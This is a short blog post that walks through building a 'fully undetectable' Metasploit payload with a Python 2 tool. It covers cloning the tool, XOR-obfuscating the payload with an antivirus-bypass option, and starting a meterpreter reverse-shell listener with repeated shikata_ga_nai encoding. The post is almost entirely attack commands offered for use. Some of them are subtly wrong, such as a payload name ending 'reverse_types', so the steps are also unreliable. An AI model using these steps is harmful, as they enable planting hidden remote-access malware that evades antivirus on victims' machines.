---
title: "MSF FUD With Python2"
date: 2020-11-15T10:01:06+07:00
description: Creating a msf payload FUD with python2 script.
draft: false
hideToc: false
enableToc: true
enableTocContent: true
author: thik
authorEmoji: 🐱
tags: 
- msf
- obfuscate
- bypass
categories:
- FUD
series:
- Python2
image: images/feature/article-one.png
---

#### Requirements
- Kali Linux (Recommend)
- Metasploit Framework
- Wine, Mingw-w64 Compiler, python2
- pip2 install wheel pycrypto termcolor

#### Installation
{{< highlight plain "linenos=table" >}}
git clone https://github.com/stormshadow07/HackTheWorld.git
cd HackTheWorld
chmod +x install.sh && ./install.sh
{{< / highlight >}}

#### Generate Payload
{{< highlight plain "lineos=table" >}}
cd HackTheWorld
python2 HackTheWorld.py
...
Enter payload type (tcp, http/s) and  lhost/lport
...
Enter XOR Key
...
1 for adding manifest bypass AV
...
Final payload in Result dir
{{< / highlight >}}

#### Listener
{{< highlight plain "lineos=table" >}}
sudo service postgresql start
msfconsole
...
use exploit/multi/handler
set payload windows/meterpreter/reverse_types
set lhost x.x.x.x
set lport xxx
set EnableStagedEncoding true
set EncoDER x86/shikata_ga_nai
set Iterations 10
exploit
{{< / highlight >}}
